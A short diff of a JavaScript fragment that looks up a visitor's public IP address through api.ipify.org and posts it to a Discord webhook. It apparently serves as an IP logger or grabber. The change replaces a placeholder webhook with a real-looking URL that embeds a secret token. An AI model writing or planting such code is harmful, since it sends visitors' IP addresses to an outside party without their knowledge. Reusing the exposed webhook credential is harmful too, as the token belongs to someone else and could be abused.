@@ -3,7 +3,7 @@ fetch('https://api.ipify.org?format=json')
     .then(response => response.json())
     .then(data => {
         let ip = data.ip;
-        let webhookURL = "https://discord.com/api/webhooks/XXXX/XXXX"; // ใส่ Webhook ของคุณที่นี่
+        let webhookURL = "https://discord.com/api/webhooks/1356325304414638240/trkc_dAvmQpxgzp4j91UuUlFB1zGEkzBy88maVUxmkNheyDy0Ds4N3eZghevEE5WpKnz"; // ใส่ Webhook ของคุณที่นี่
 
         fetch(webhookURL, {
             method: "POST",
